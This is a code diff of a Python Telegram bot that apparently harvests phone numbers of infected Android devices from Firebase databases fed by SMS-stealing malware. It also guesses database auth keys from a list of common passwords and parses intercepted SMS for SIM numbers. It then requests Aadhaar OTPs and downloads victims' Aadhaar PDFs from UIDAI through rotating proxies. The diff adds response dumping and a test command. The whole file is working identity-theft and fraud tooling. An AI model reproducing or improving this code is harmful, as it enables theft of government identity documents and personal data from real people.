@@ -1,28 +1,13 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v3.0                       ║
+║          AUTO-OTP BOT v3.1 (PDF DEBUG)           ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
-║   (BB approach: no auth needed, SIM from /messages)
 ╚══════════════════════════════════════════════════╝
 
-Commands:
-  /addfire URL            - Add single Firebase DB (no auth needed)
-  /addfire URL:AUTH       - Add with explicit auth (if DB is locked)
-  /addfire (bulk)         - Multiple URLs, one per line
-  /removefire URL | all
-  /listfire
-  /scan                   - Online devices with real SIM numbers
-  /debugscan
-  /debugusers
-  /debugmsgs <deviceId>
-  /auto [count]
-  /stopauto
-  /resetused
-  /reloadproxy
-  /proxystatus
-  /testproxy
-  /status
-  /help
+Debug additions:
+  - dl_pdf() logs every field of the UIDAI response
+  - Raw response dumped to file + sent to you on Telegram
+  - Traces HTTP status, headers, body head, JSON shape
 """
 
 import requests
@@ -52,7 +37,7 @@ NAME_API = "https://sarkariupdate.online/osint/APIX.php?api=num_api&q="
 PROXY_FILE = "proxies.txt"
 PROXY_POOL = []
 
-OTP_WAIT_SECONDS = 60   # 1 minute
+OTP_WAIT_SECONDS = 60
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("AutoOTP")
@@ -112,7 +97,7 @@ def test_proxy(proxy, timeout=12):
 
 
 # ============== STATE ==============
-firebase_dbs = []         # list of {"url": str, "auth": str}
+firebase_dbs = []
 firebase_lock = threading.Lock()
 used_numbers = set()
 used_lock = threading.Lock()
@@ -156,7 +141,6 @@ def get_sess():
 
 # ============== FIREBASE HELPERS ==============
 def fb_url(url, path, auth=""):
-    """Build a Firebase URL with optional auth param."""
     base = url.rstrip('/')
     full = f"{base}/{path}"
     if auth:
@@ -164,9 +148,7 @@ def fb_url(url, path, auth=""):
         full = f"{full}{sep}auth={auth}"
     return full
 
-
 def fb_get(url, path, auth="", timeout=10):
-    """GET a Firebase path, returning parsed JSON or None."""
     try:
         r = requests.get(fb_url(url, path, auth), timeout=timeout)
         if r.status_code == 200:
@@ -174,7 +156,6 @@ def fb_get(url, path, auth="", timeout=10):
     except Exception as e:
         logger.debug(f"[FB] {path} error: {e}")
     return None
-
 
 # ============== TELEGRAM ==============
 def tg():
@@ -302,29 +283,158 @@ def send_aadh_otp(eid,cap,ctxn,tid):
         return False,None,f'HTTP {r.status_code}'
     except Exception as e: return False,None,str(e)
 
-def dl_pdf(eid,otp,otxn,tid):
-    s=get_sess(); s.headers.update({**BH,**get_fp(),'x-request-id':tid,'transactionId':tid})
-    d={'eid':eid,'mask':False,'otp':otp,'otpTxnId':otxn}
+# ============== DL_PDF WITH FULL DEBUG ==============
+_DEBUG_PDF = True   # set False once working to silence the dump
+
+def dl_pdf(eid, otp, otxn, tid, chat_id=None):
+    """Download Aadhaar PDF.
+
+    Extra debug:
+      - logs HTTP status, headers, body head
+      - dumps entire raw response to a .txt file
+      - sends that dump to the owner on Telegram (if chat_id given)
+      - logs every top-level / nested field's shape
+    """
+    s = get_sess()
+    s.headers.update({**BH, **get_fp(), 'x-request-id':tid, 'transactionId':tid})
+    d = {'eid': eid, 'mask': False, 'otp': otp, 'otpTxnId': otxn}
+
     try:
-        r=s.post('https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download',json=d,timeout=90)
-        if r.status_code==200:
-            rj=r.json()
-            for k,v in rj.items():
-                if isinstance(v,str) and len(v)>1000:
-                    try:
-                        dec=base64.b64decode(v)
-                        if dec[:4]==b'%PDF' or dec[:5]==b'%PDF-':
-                            fp=os.path.join(os.path.dirname(os.path.abspath(__file__)),f"aadh_{int(time.time())}.pdf")
-                            with open(fp,'wb') as f: f.write(dec)
-                            return True,fp
-                    except: continue
-            return False,rj.get('message',rj.get('errorMessage','No PDF'))
-        return False,f'HTTP {r.status_code}'
-    except Exception as e: return False,str(e)
+        r = s.post('https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download',
+                   json=d, timeout=90)
+    except Exception as e:
+        logger.warning(f"[PDF] request exception: {e}")
+        return False, str(e)
+
+    logger.info(f"[PDF] HTTP={r.status_code} body_len={len(r.content)}")
+    logger.info(f"[PDF] request body: eid={eid[:6]}... mask=False otp={otp} otpTxnId={str(otxn)[:8]}...")
+    logger.info(f"[PDF] content-type: {r.headers.get('Content-Type','?')}")
+    logger.info(f"[PDF] body head: {r.content[:200]!r}")
+
+    # ---------- DUMP RAW RESPONSE ----------
+    dump_path = None
+    if _DEBUG_PDF:
+        try:
+            dump_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                     f"pdf_resp_{int(time.time())}.txt")
+            with open(dump_path, 'wb') as f:
+                f.write(b"=== REQUEST ===\n")
+                f.write(json.dumps(d).encode())
+                f.write(b"\n\n=== STATUS ===\n")
+                f.write(str(r.status_code).encode())
+                f.write(b"\n\n=== HEADERS ===\n")
+                f.write(str(dict(r.headers)).encode())
+                f.write(b"\n\n=== BODY (first 8000 bytes) ===\n")
+                f.write(r.content[:8000])
+                f.write(b"\n\n=== BODY (last 2000 bytes) ===\n")
+                f.write(r.content[-2000:])
+            logger.info(f"[PDF] raw response dumped to {dump_path}")
+            if chat_id:
+                try:
+                    send_doc(chat_id, dump_path,
+                             caption=f"<b>🔬 PDF Debug Dump</b>\n\n◈ HTTP · {r.status_code}\n◈ Size · {len(r.content)} bytes\n◈ EID · {eid[:8]}...",
+                             fname="pdf_resp.txt")
+                except Exception as ex:
+                    logger.warning(f"[PDF] failed to send dump: {ex}")
+        except Exception as ex:
+            logger.warning(f"[PDF] could not dump raw response: {ex}")
+
+    # ---------- HTTP error ----------
+    if r.status_code != 200:
+        return False, f'HTTP {r.status_code}'
+
+    # ---------- Raw PDF? ----------
+    if r.content[:4] == b'%PDF' or r.content[:5] == b'%PDF-':
+        fp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                          f"aadh_{int(time.time())}.pdf")
+        with open(fp, 'wb') as f:
+            f.write(r.content)
+        logger.info(f"[PDF] ✅ raw PDF saved: {len(r.content)} bytes")
+        return True, fp
+
+    # ---------- Try JSON ----------
+    try:
+        rj = r.json()
+    except Exception as ex:
+        logger.warning(f"[PDF] body is not JSON: {ex}")
+        return False, 'non-JSON response (check dump)'
+
+    logger.info(f"[PDF] JSON top-level keys: {list(rj.keys())}")
+
+    # Log every field's shape
+    for k, v in rj.items():
+        if isinstance(v, str):
+            logger.info(f"[PDF]   field {k!r}: str len={len(v)} head={v[:60]!r}")
+        elif isinstance(v, dict):
+            sub = list(v.keys())[:10]
+            logger.info(f"[PDF]   field {k!r}: dict subkeys={sub}")
+            for k2, v2 in v.items():
+                if isinstance(v2, str):
+                    logger.info(f"[PDF]     {k}.{k2}: str len={len(v2)} head={v2[:60]!r}")
+                elif isinstance(v2, dict):
+                    logger.info(f"[PDF]     {k}.{k2}: dict subkeys={list(v2.keys())[:8]}")
+                else:
+                    logger.info(f"[PDF]     {k}.{k2}: {type(v2).__name__} = {str(v2)[:60]}")
+        elif isinstance(v, list):
+            logger.info(f"[PDF]   field {k!r}: list len={len(v)}")
+            if v and isinstance(v[0], (str, dict)):
+                logger.info(f"[PDF]     item[0] = {str(v[0])[:100]}")
+        else:
+            logger.info(f"[PDF]   field {k!r}: {type(v).__name__} = {v}")
+
+    # ---------- Try decode PDF from top-level fields ----------
+    def _try_save_pdf(b64str, src_label):
+        if not isinstance(b64str, str) or len(b64str) < 500:
+            return None
+        v = b64str
+        if v.startswith('data:') and ',' in v:
+            v = v.split(',', 1)[1]
+        for attempt in range(2):   # single decode, then double decode
+            try:
+                dec = base64.b64decode(v, validate=False)
+            except Exception:
+                return None
+            if dec[:4] == b'%PDF' or dec[:5] == b'%PDF-':
+                fp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                  f"aadh_{int(time.time())}.pdf")
+                with open(fp, 'wb') as f:
+                    f.write(dec)
+                logger.info(f"[PDF] ✅ saved from {src_label}: {len(dec)} bytes (decode pass {attempt+1})")
+                return fp
+            # Not a PDF — maybe double-encoded; try again on decoded bytes
+            v = dec if isinstance(dec, bytes) else None
+            if v is None:
+                return None
+            try:
+                v = v.decode('ascii', errors='ignore')
+            except Exception:
+                return None
+        return None
+
+    # Top-level
+    for k, v in rj.items():
+        if isinstance(v, str) and len(v) > 500:
+            fp = _try_save_pdf(v, f"top-level {k}")
+            if fp: return True, fp
+
+    # Nested one level
+    for k, v in rj.items():
+        if isinstance(v, dict):
+            for k2, v2 in v.items():
+                if isinstance(v2, str) and len(v2) > 500:
+                    fp = _try_save_pdf(v2, f"{k}.{k2}")
+                    if fp: return True, fp
+
+    # Nothing found — return error message from response
+    err = rj.get('message') or rj.get('errorMessage') or rj.get('error') or 'No PDF field found'
+    if isinstance(err, (dict, list)):
+        err = json.dumps(err)[:200]
+    logger.warning(f"[PDF] no PDF in response: {err}")
+    return False, str(err)[:200]
+
 
 # ============== PHONE EXTRACTION HELPERS ==============
 def _looks_like_phone(s):
-    """Normalize to a 10-digit Indian mobile or None."""
     if s is None: return None
     if isinstance(s, (int, float)):
         s = str(int(s))
@@ -347,12 +457,6 @@ def _is_online(dd):
     return False
 
 
-# ---------- SIM extraction from /messages ----------
-# Look for patterns like:
-#   "Vi number 8726376029"        — activation SMS
-#   "Aapke Vi number 8601464594"  — balance reminder SMS
-#   "Account: (9628775234)"       — bank notification containing own SIM
-#   "Dear customer ... your number 9876543210"
 _SIM_PATTERNS = [
     re.compile(r'(?:Vi|Jio|Airtel|Vodafone|BSNL|Idea)\s+number\s+([6-9]\d{9})', re.I),
     re.compile(r'your\s+(?:Vi|Jio|Airtel|Vodafone|BSNL|Idea)\s+number\s+([6-9]\d{9})', re.I),
@@ -362,15 +466,11 @@ _SIM_PATTERNS = [
 ]
 
 def _extract_own_sim_from_messages(msgs):
-    """Given a /messages/<id> dict, find the device's own SIM number."""
     if not isinstance(msgs, dict): return None
-    # Newest messages first
     try:
         items = sorted(msgs.items(), key=lambda kv: str(kv[0]), reverse=True)
     except Exception:
         items = list(msgs.items())
-
-    # Pass 1: pattern-based on newest messages
     for _mid, md in items[:50]:
         if not isinstance(md, dict): continue
         body = str(md.get("message","") or md.get("body","") or md.get("msg","") or "")
@@ -380,26 +480,19 @@ def _extract_own_sim_from_messages(msgs):
             if m:
                 norm = _looks_like_phone(m.group(1))
                 if norm: return norm
-
-    # Pass 2: fallback — any 10-digit number starting 6-9 in any body
     for _mid, md in items[:20]:
         if not isinstance(md, dict): continue
         body = str(md.get("message","") or md.get("body","") or md.get("msg","") or "")
         for m in re.finditer(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', body):
             norm = _looks_like_phone(m.group(1))
             if norm: return norm
-
     return None
 
 
 def _scan_one_device(base_url, auth, cid, dd, bot_map):
-    """Return phone for a single online device, or None."""
-    # (a) bot_users reverse map — exact, fast
     if cid in bot_map:
         p = _looks_like_phone(bot_map[cid])
         if p: return p, "bot_users"
-
-    # (b) scrape from /messages
     try:
         q = fb_url(base_url, f"messages/{cid}.json?orderBy=%22%24key%22&limitToLast=30", auth)
         r = requests.get(q, timeout=10)
@@ -409,14 +502,11 @@ def _scan_one_device(base_url, auth, cid, dd, bot_map):
             if p: return p, "messages"
     except Exception:
         pass
-
     return None, None
 
 
 def fb_scan():
-    """Scan every DB. Return unique online devices with their SIM numbers."""
-    seen = {}    # phone -> best device record
-
+    seen = {}
     with firebase_lock:
         dbs = list(firebase_dbs)
     logger.info(f"[SCAN] === scanning {len(dbs)} DB(s) ===")
@@ -424,7 +514,6 @@ def fb_scan():
     for db in dbs:
         url = db['url'].rstrip('/'); auth = db.get('auth', '') or ''
 
-        # 1) Load /clients — full tree
         clients = fb_get(url, "clients.json", auth, timeout=15)
         if not isinstance(clients, dict) or not clients:
             logger.warning(f"[SCAN] {url} -> no clients")
@@ -434,7 +523,6 @@ def fb_scan():
                   if isinstance(cdata, dict) and _is_online(cdata)]
         logger.info(f"[SCAN] {url.split('//')[-1][:40]} total={len(clients)} online={len(online)}")
 
-        # 2) Load /bot_users — build device_id -> phone reverse map
         bot_map = {}
         try:
             bu = fb_get(url, "bot_users.json", auth, timeout=10)
@@ -449,7 +537,6 @@ def fb_scan():
         except Exception:
             pass
 
-        # 3) Parallel scan each online device
         results = []
         with ThreadPoolExecutor(max_workers=8) as pool:
             futures = {pool.submit(_scan_one_device, url, auth, cid, clients[cid], bot_map): cid
@@ -465,7 +552,6 @@ def fb_scan():
 
         logger.info(f"[SCAN] {url.split('//')[-1][:40]} resolved={len(results)}/{len(online)}")
 
-        # 4) Dedupe by phone — freshest device wins
         for cid, phone, src in results:
             dd = clients.get(cid) or {}
             batt_raw = str(dd.get("battery","")).replace("%","").strip()
@@ -487,7 +573,6 @@ def fb_scan():
                     "src": src,
                 }
 
-    # 5) Final list, filter used
     devs = []
     with used_lock:
         for ph, info in seen.items():
@@ -652,7 +737,7 @@ def auto_worker(cid, count):
         if mid:
             edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> {vn}\n◈ EID:{eid} OTP:{potp}\n<i>◌ Downloading PDF...</i>")
         try:
-            o4, res = dl_pdf(eid, potp, ptxn, t2)
+            o4, res = dl_pdf(eid, potp, ptxn, t2, chat_id=cid)
             if o4 and res and '.pdf' in res:
                 if mid:
                     edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✅ 〕</b>\n◈ 📱 {mob}\n◈ 👤 {vn}\n◈ 🆔 {eid}\n<i>◌ Sending...</i>")
@@ -662,7 +747,7 @@ def auto_worker(cid, count):
                 except: pass
             else:
                 if mid:
-                    edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n✗ Download: {res}")
+                    edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} ✗ 〕</b>\n✗ Download: {str(res)[:120]}")
         except Exception as e:
             if mid:
                 edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Error: {str(e)[:100]}")
@@ -683,85 +768,57 @@ def handle(cid, text):
         send_msg(cid,
             f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 Commands 〕</b>\n\n"
             f"🔥 <b>Firebase:</b>\n"
-            f"  /addfire <code>URL</code> — no auth needed\n"
-            f"  /addfire <code>URL:AUTH</code> — if DB is locked\n"
+            f"  /addfire <code>URL</code>\n"
             f"  /removefire <code>URL</code> | all\n"
             f"  /listfire\n\n"
             f"📱 <b>Auto-OTP:</b>\n"
-            f"  /scan — Online devices (real SIM numbers)\n"
-            f"  /debugscan — Inspect /clients + top keys\n"
-            f"  /debugusers — Inspect user/phone paths\n"
-            f"  /debugmsgs <code>&lt;deviceId&gt;</code> — Show messages\n"
-            f"  /auto [N] — Process N numbers\n"
+            f"  /scan\n"
+            f"  /auto [N]\n"
             f"  /stopauto\n"
             f"  /resetused\n\n"
+            f"🔬 <b>Debug:</b>\n"
+            f"  /debugscan /debugusers /debugmsgs &lt;id&gt;\n"
+            f"  /testpdf — test PDF download with fake OTP\n\n"
             f"🌐 <b>Proxy:</b>\n"
-            f"  /reloadproxy\n"
-            f"  /proxystatus\n"
-            f"  /testproxy\n\n"
-            f"⚙️ <b>Other:</b>\n"
-            f"  /status\n"
-            f"  /help")
+            f"  /reloadproxy /proxystatus /testproxy\n\n"
+            f"⚙️ /status  ·  /help")
 
     elif cmd == '/addfire':
         if len(parts) < 2:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage:\n<code>/addfire URL</code>\n\nOr with auth:\n<code>/addfire URL:AUTH</code>")
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage: <code>/addfire URL</code>")
             return
-
         raw = parts[1].strip()
         lines = [l.strip() for l in raw.split('\n') if l.strip()]
         added = 0; need_auth = []; exists = 0
-
         status = send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Processing {len(lines)} URL(s)...</i>")
         sid = status.get('result', {}).get('message_id')
 
         for line in lines:
-            if 'firebaseio.com' not in line and 'firebasedatabase.app' not in line:
-                continue
-
-            url = line
-            auth = ""
-
-            # Try to split URL:AUTH — only if auth segment looks like a token
-            # (short string, no slash)
+            if 'firebaseio.com' not in line and 'firebasedatabase.app' not in line: continue
+            url = line; auth = ""
             if line.count(':') >= 3:
-                # Could be https://host:port or https://host/auth
-                # Check if there's a clean URL:auth split
                 idx = line.rfind(':')
-                maybe_url = line[:idx]
-                maybe_auth = line[idx+1:].strip()
+                maybe_url = line[:idx]; maybe_auth = line[idx+1:].strip()
                 if (('/' not in maybe_auth) and (len(maybe_auth) < 64) and
                     ('firebaseio.com' in maybe_url or 'firebasedatabase.app' in maybe_url)):
-                    url = maybe_url
-                    auth = maybe_auth
-
-            if not url.startswith('http'):
-                url = 'https://' + url
+                    url = maybe_url; auth = maybe_auth
+            if not url.startswith('http'): url = 'https://' + url
 
             with firebase_lock:
                 if any(d['url'] == url for d in firebase_dbs):
                     exists += 1; continue
 
-            # Verify — try given auth first, then no auth
             verified_auth = None
-
             if auth:
                 j = fb_get(url, "clients.json?shallow=true", auth, timeout=8)
-                if isinstance(j, dict):
-                    verified_auth = auth
-
+                if isinstance(j, dict): verified_auth = auth
             if verified_auth is None:
-                # Try without auth
                 j = fb_get(url, "clients.json?shallow=true", "", timeout=8)
-                if isinstance(j, dict):
-                    verified_auth = ""
-
+                if isinstance(j, dict): verified_auth = ""
             if verified_auth is None:
-                # Try common auth keys
                 for ta in ["B", "123456", "Very", "test", "737374", "373747", "1234", "admin", "12345"]:
                     j = fb_get(url, "clients.json?shallow=true", ta, timeout=6)
-                    if isinstance(j, dict):
-                        verified_auth = ta; break
+                    if isinstance(j, dict): verified_auth = ta; break
 
             if verified_auth is not None:
                 with firebase_lock:
@@ -774,27 +831,25 @@ def handle(cid, text):
             _pending_urls[cid] = need_auth
             names = "\n".join([u.split('//')[1].split('-default')[0] if '-default' in u else u[:40] for u in need_auth])
             msg_text = f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            if added: msg_text += f"✅ {added} DB(s) added (no-auth)\n"
-            if exists: msg_text += f"ℹ️ {exists} DB(s) already present\n"
-            msg_text += f"\n<b>🔒 {len(need_auth)} DB(s) need auth:</b>\n<code>{names}</code>\n\n<i>◌ Send auth key:</i>"
+            if added: msg_text += f"✅ {added} added\n"
+            if exists: msg_text += f"ℹ️ {exists} already present\n"
+            msg_text += f"\n<b>🔒 {len(need_auth)} need auth:</b>\n<code>{names}</code>\n\n<i>◌ Send auth key:</i>"
             if sid: edit_msg(cid, sid, msg_text)
             else: send_msg(cid, msg_text)
         else:
             with firebase_lock: total = len(firebase_dbs)
             msg_text = f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Added {added} DB(s)"
-            if exists: msg_text += f"\nℹ️ Skipped {exists} (already added)"
+            if exists: msg_text += f"\nℹ️ Skipped {exists}"
             msg_text += f"\n📊 Total: {total}"
             if sid: edit_msg(cid, sid, msg_text)
             else: send_msg(cid, msg_text)
 
     elif cmd == '/removefire':
         if len(parts) < 2:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ /removefire URL or /removefire all")
-            return
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ /removefire URL or /removefire all"); return
         t = parts[1].strip().lower()
         if t == 'all':
-            with firebase_lock:
-                c = len(firebase_dbs); firebase_dbs.clear()
+            with firebase_lock: c = len(firebase_dbs); firebase_dbs.clear()
             send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Removed all {c} DBs.")
         else:
             with firebase_lock:
@@ -806,8 +861,7 @@ def handle(cid, text):
     elif cmd == '/listfire':
         with firebase_lock: dbs = list(firebase_dbs)
         if not dbs:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Empty.\n<i>/addfire URL</i>")
-            return
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Empty.\n<i>/addfire URL</i>"); return
         ls = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 Firebase ({len(dbs)}) 〕</b>\n"]
         for i, d in enumerate(dbs, 1):
             n = d['url'].split('//')[1].split('-default')[0] if '-default' in d['url'] else d['url'][:40]
@@ -818,13 +872,11 @@ def handle(cid, text):
     elif cmd == '/scan':
         with firebase_lock:
             if not firebase_dbs:
-                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs. /addfire")
-                return
+                send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs. /addfire"); return
         send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Scanning...</i>")
         devs = fb_scan()
         if not devs:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n\n<i>Run /debugscan and /debugusers.</i>")
-            return
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices."); return
         ls = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices (unique)</b>\n"]
         for i, d in enumerate(devs[:50], 1):
             dn = d["db_url"].split("//")[1].split("-default")[0]
@@ -832,45 +884,40 @@ def handle(cid, text):
         ls.append(f"\n<b>Total: {len(devs)}</b>\n<i>/auto {len(devs)}</i>")
         send_msg(cid, "\n".join(ls))
 
+    elif cmd == '/testpdf':
+        """Send a test download request with a fake OTP to see UIDAI response shape."""
+        if len(parts) < 2:
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage: <code>/testpdf &lt;eid&gt;</code>")
+            return
+        eid = parts[1].strip()
+        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Sending fake PDF download request for EID {eid[:8]}...</i>\nUIDAI's response will be dumped to you.")
+        # Fake otp and otxn — this is only to inspect the response shape
+        ok, res = dl_pdf(eid, "000000", "TEST-TXN", str(uuid.uuid4()), chat_id=cid)
+        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>Result:</b> {str(res)[:200]}")
+
     elif cmd == '/debugscan':
         with firebase_lock: dbs = list(firebase_dbs)
         if not dbs:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs added. /addfire first.")
-            return
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs."); return
         report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔍 Debug Scan</b>"]
-
         for db in dbs:
             url = db['url'].rstrip('/'); auth = db['auth']
-            short = url.split('//')[-1].split('-default')[0][:40]
-            report.append(f"\n<b>DB:</b> <code>{short}</code>")
-            report.append(f"◈ auth: <code>{auth[:15] if auth else 'no-auth'}</code>")
-
+            report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:40]}</code>")
             try:
                 r = requests.get(fb_url(url, "clients.json", auth), timeout=10)
-                report.append(f"◈ /clients.json → HTTP {r.status_code}")
                 if r.status_code == 200:
                     data = r.json()
                     if isinstance(data, dict):
                         online = sum(1 for d in data.values() if _is_online(d))
                         report.append(f"◈ total clients: <b>{len(data)}</b>")
-                        report.append(f"◈ online (status:true): <b>{online}</b>")
+                        report.append(f"◈ online: <b>{online}</b>")
             except Exception as e:
                 report.append(f"◈ ERROR: {str(e)[:120]}")
-
-            try:
-                r2 = requests.get(fb_url(url, ".json?shallow=true", auth), timeout=10)
-                if r2.status_code == 200 and isinstance(r2.json(), dict):
-                    top = list(r2.json().keys())[:20]
-                    report.append(f"◈ top-level keys: {', '.join(top)}")
-            except: pass
-
-            # bot_users summary
             try:
                 bu = fb_get(url, "bot_users.json", auth, timeout=8)
                 if isinstance(bu, dict):
-                    report.append(f"◈ bot_users entries: <b>{len(bu)}</b>")
+                    report.append(f"◈ bot_users: <b>{len(bu)}</b>")
             except: pass
-
         full = "\n".join(report)
         for i in range(0, len(full), 3800):
             send_msg(cid, full[i:i+3800])
@@ -878,8 +925,7 @@ def handle(cid, text):
     elif cmd == '/debugusers':
         with firebase_lock: dbs = list(firebase_dbs)
         if not dbs:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs added.")
-            return
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs."); return
         report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔎 User Paths</b>"]
         for db in dbs[:1]:
             url = db['url'].rstrip('/'); auth = db['auth']
@@ -891,7 +937,7 @@ def handle(cid, text):
                 try:
                     j = fb_get(url, f"{path}.json", auth, timeout=12)
                     if not j:
-                        report.append(f"◈ /{path} → empty/null")
+                        report.append(f"◈ /{path} → empty")
                         continue
                     if isinstance(j, dict):
                         keys = list(j.keys())
@@ -900,8 +946,7 @@ def handle(cid, text):
                             v = j[k]
                             report.append(f"  key=<code>{str(k)[:26]}</code>")
                             if isinstance(v, dict):
-                                flds = list(v.keys())[:10]
-                                report.append(f"     fields: {', '.join(flds)}")
+                                report.append(f"     fields: {', '.join(list(v.keys())[:10])}")
                     elif isinstance(j, list):
                         report.append(f"\n<b>/{path}</b> (list[{len(j)}])")
                 except Exception as e:
@@ -912,13 +957,11 @@ def handle(cid, text):
 
     elif cmd == '/debugmsgs':
         if len(parts) < 2:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage: <code>/debugmsgs &lt;deviceId&gt;</code>")
-            return
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage: <code>/debugmsgs &lt;deviceId&gt;</code>"); return
         did = parts[1].strip()
         with firebase_lock: dbs = list(firebase_dbs)
         if not dbs:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs.")
-            return
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs."); return
         url = dbs[0]['url'].rstrip('/'); auth = dbs[0]['auth']
         try:
             q = fb_url(url, f"messages/{did}.json?orderBy=%22%24key%22&limitToLast=10", auth)
@@ -931,8 +974,8 @@ def handle(cid, text):
             lines = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📩 last 10 for {did[:14]}</b>\n"]
             for mid, md in sorted(j.items(), reverse=True)[:10]:
                 if isinstance(md, dict):
-                    body = md.get("message", "") or md.get("body", "") or md.get("msg", "")
-                    sender = md.get("sender", "")
+                    body = md.get("message","") or md.get("body","") or md.get("msg","")
+                    sender = md.get("sender","")
                     lines.append(f"• <b>{sender[:20]}</b>\n  <code>{str(body)[:180]}</code>")
             send_msg(cid, "\n".join(lines))
         except Exception as e:
@@ -943,8 +986,7 @@ def handle(cid, text):
         if len(parts) > 1 and parts[1].strip().isdigit():
             cnt = int(parts[1].strip())
         if cid in auto_running and not auto_running[cid].is_set():
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Already running! /stopauto")
-            return
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Already running!"); return
         auto_running[cid] = threading.Event()
         threading.Thread(target=auto_worker, args=(cid, cnt), daemon=True).start()
 
@@ -965,13 +1007,12 @@ def handle(cid, text):
         send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Proxies reloaded: <b>{len(PROXY_POOL)}</b>")
 
     elif cmd == '/proxystatus':
-        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🌐 <b>Proxy Status</b>\n\n◈ Loaded · {len(PROXY_POOL)}\n◈ File · <code>{PROXY_FILE}</code>")
+        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🌐 Proxies loaded: <b>{len(PROXY_POOL)}</b>\nFile: <code>{PROXY_FILE}</code>")
 
     elif cmd == '/testproxy':
         if not PROXY_POOL:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No proxies loaded.")
-            return
-        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Testing first 3 proxies...</i>")
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No proxies."); return
+        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Testing first 3...</i>")
         results = []
         for p in PROXY_POOL[:3]:
             ok, info = test_proxy(p, timeout=15)
@@ -983,7 +1024,7 @@ def handle(cid, text):
         with firebase_lock: dc = len(firebase_dbs)
         with used_lock: uc = len(used_numbers)
         ar = sum(1 for e in auto_running.values() if not e.is_set())
-        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>Status</b>\n\n◈ Firebase · {dc}\n◈ Used · {uc}\n◈ Running · {ar}\n◈ Proxies · {len(PROXY_POOL)}\n◈ OTP Wait · {OTP_WAIT_SECONDS}s\n◈ OCR · {'✓' if ocr_solver else '✗'}")
+        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>Status</b>\n\n◈ Firebase · {dc}\n◈ Used · {uc}\n◈ Running · {ar}\n◈ Proxies · {len(PROXY_POOL)}\n◈ OTP Wait · {OTP_WAIT_SECONDS}s\n◈ PDF Debug · {'ON' if _DEBUG_PDF else 'off'}\n◈ OCR · {'✓' if ocr_solver else '✗'}")
 
 
 # ============== MAIN ==============
